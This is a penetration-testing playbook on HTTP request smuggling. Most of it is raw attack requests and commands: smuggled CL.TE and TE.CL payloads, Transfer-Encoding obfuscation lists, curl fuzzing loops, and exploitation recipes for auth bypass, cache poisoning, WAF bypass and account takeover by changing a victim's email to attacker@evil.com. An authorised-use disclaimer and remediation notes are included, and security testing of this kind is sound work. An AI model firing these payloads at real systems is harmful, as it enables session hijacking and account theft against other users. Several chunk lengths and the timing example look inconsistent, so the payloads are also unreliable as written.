# HTTP Request Smuggling (Desync) — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application)
**OWASP Mapping:** A04:2021 – Insecure Design
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: request-smuggling-v1
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A04:2021-InsecureDesign
tags:
  - request-smuggling
  - http-desync
  - CL-TE
  - TE-CL
  - TE-TE
  - cache-poisoning
  - T1190
  - waf-bypass
environments:
  - web
  - proxy
  - load-balancer
  - cdn
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Architecture Awareness

Request smuggling arises where a front-end proxy/load balancer/CDN and a back-end server disagree about where one HTTP request ends. Candidate stacks: nginx -> apache, haproxy -> tomcat, varnish -> php-fpm, AWS ALB -> node.

### 1.2 Frontend/Backend Discrepancy

| Vulnerability | Front-end parses | Back-end parses |
|---|---|---|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Transfer-Encoding (first/middle/last) | Transfer-Encoding (different field) |

### 1.3 Timing-Based Detection (CL.TE)

```bash
# Send a CL with no body and a smuggled prefix; back-end waits for the TE body
time curl -s --max-time 25 \
  -H 'Content-Length: 4' \
  -H 'Transfer-Encoding: chunked' \
  -d '5c' \
  "https://target.com/" -o /dev/null -w "%{time_total}\n"
# If the response is delayed by ~1s+ the request was poisoned -> CL.TE likely
```

---

## 2. Confirmation

### 2.1 CL.TE Confirm with Reflected Poison

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

60
POST /404 HTTP/1.1
X-Ignore: X

0
```
If a follow-up legitimate request returns `404 Not Found`, the smuggled `POST /404` was consumed first -> CL.TE confirmed.

### 2.2 TE.CL Confirm

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /404 HTTP/1.1
Content-Length: 4

0

```
Follow-up request returns 404 -> TE.CL confirmed.

### 2.3 TE.TE Confirmation

Obfuscate the `Transfer-Encoding` header so the front-end accepts it while the back-end ignores it:
```
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
X: X\nTransfer-Encoding: chunked
```

---

## 3. Exploitation

### 3.1 Smuggling to Bypass Authentication

Smuggle a request against an admin-only endpoint that the front-end would otherwise block:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /admin/delete HTTP/1.1
Host: target.com
X-Ignore: X
```
The front-end forwards one request; the back-end sees the smuggled `POST /admin/delete`.

### 3.2 Cache Poisoning via Smuggling

Poison a cached page for other users:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

87
GET / HTTP/1.1
Host: target.com
X-Ignore: X
```
When the next victim's request is appended to the poisoned body, they receive the cache keyed to the smuggled request; inject attacker-controlled content or credentials theft via a logged-in victim's cookies appended to the smuggled request.

### 3.3 Account Takeover via Smuggled Request

Smuggle a password-reset or email-change POST consumed with the victim's session cookie:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

8e
POST /account/change-email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=attacker@evil.com&csrf=
```
The victim's own request body/cookies complete the smuggled state change -> account takeover.

### 3.4 WAF Bypass

Front-end WAFs only inspect the first request; smuggle the malicious payload in the second request (or split it across the CL/TE boundary) so the WAF never sees the full payload.

---

## 4. Tool-Specific Guidance

### 4.1 PortSwigger Request Smuggler (Burp extension)

```bash
# Install from BApp Store: "HTTP Request Smuggler" by PortSwigger
# Usage in Burp Repeater:
#   -> Extensions tab -> "Smuggling attacks" 
#   -> select "CL.TE", "TE.CL", "TE.TE"
#   -> "Scan" the endpoint to fingerprint variant
```

Manual Burp flow:
1. Repeater: paste the CL.TE poison request
2. Send a benign request in a second Repeater tab
3. If the second request returns the poisoned response, desync confirmed
4. Use the "Smuggler" scan tab to automate variant detection across the site

### 4.2 curl-based variant fuzzing

```bash
# Quick TE.TE header obfuscation matrix
for h in 'chunked' 'xchunked' ' chunked' 'Chunked' 'chunked;x=1'; do
  curl -s --max-time 10 -H "Transfer-Encoding: $h" \
    -d '0
' "https://target.com/" -o /dev/null -w "$h -> %{http_code}\n"
done
```

### 4.3 Nuclei desync templates

```bash
nuclei -u https://target.com -t ~/nuclei-templates/http/vulnerabilities/http-request-smuggling/ -jsonl smuggle.jsonl
```

### 4.4 Turbo Intruder (Timing oracle)

Use Turbo Intruder's `smuggle_cl_te`/`smuggle_te_cl` race scripts to detect sub-100ms timing differences at scale.

---

## 5. PoC Generation

### PoC Template

```markdown
## HTTP Request Smuggling — [FINDING_ID]

**Type:** CL.TE / TE.CL / TE.TE
**Frontend:** nginx/haproxy/ALB
**Backend:** tomcat/node/php-fpm
**Impact:** Auth bypass / Cache poisoning / ATO / WAF bypass

### Payload
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

60
POST /404 HTTP/1.1
X-Ignore: X

0
```

### Evidence
```
After smuggling, a normal GET / returns: HTTP/1.1 404 Not Found
```

### Impact
- Auth bypass: YES/NO
- Cache poisoning: YES/NO
- Account takeover: YES/NO
- WAF bypass: YES/NO

### Remediation
- Normalise to HTTP/2 (h2 fully multiplexes, eliminating classic smuggling)
- Disable Transfer-Encoding at the front-end; use fixed CL only
- Keep front/back-end in same HTTP parser family
- Reject conflicting CL+TE requests (RFC 7230)

### Reproduction Steps
1. Send CL.TE poison request
2. Follow with benign request
3. Observe smuggled response / 404
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Desync variant identified deterministically (timing + follow-up request)
- [ ] Cache-poisoning tested only against sandbox cache
- [ ] No victim traffic poisoned in production
- [ ] ATO chain validated in isolated environment only
- [ ] Evidence (raw request/response pairs) captured for both poisoned and benign requests

---

## 7. Cheat Sheet/Reference

| Variant | Detection signature |
|---|---|
| CL.TE | Back-end waits on TE body; timing delay; follow-up request polluted |
| TE.CL | Back-end uses CL; smuggled prefix before `0` |
| TE.TE | Header obfuscation causes one side to ignore TE |
| HTTP/2 downgrade | h2 -> h1 conversion can reintroduce desync (request tunneling) |

**TE.TE obfuscation examples:**
```
Transfer-Encoding: chunked, chunked
Transfer-Encoding: chunked,identity
Transfer-Encoding: xchunked
Transfer-Encoding: chunked;foo=bar
Transfer-Encoding : chunked
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access |
| T1078 | Valid Accounts | Auth bypass via smuggled request |
| T1498 | Network Denial of Service | Smuggling-based DoS |
| T1071.001 | Web Protocols | Delivery channel |
| T1574 | Hijack Execution Flow | Desync corruption |

---

## 9. References

- PayloadsAllTheThings Request Smuggling: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Smuggling
- HackTricks HTTP Request Smuggling: https://book.hacktricks.xyz/pentesting-web/http-request-smuggling
- PortSwigger Request Smuggler: https://github.com/PortSwigger/http-request-smuggler
- PortSwigger Web Security (Desync): https://portswigger.net/web-security/request-smuggling
- James Kettle "HTTP Desync Attacks": https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
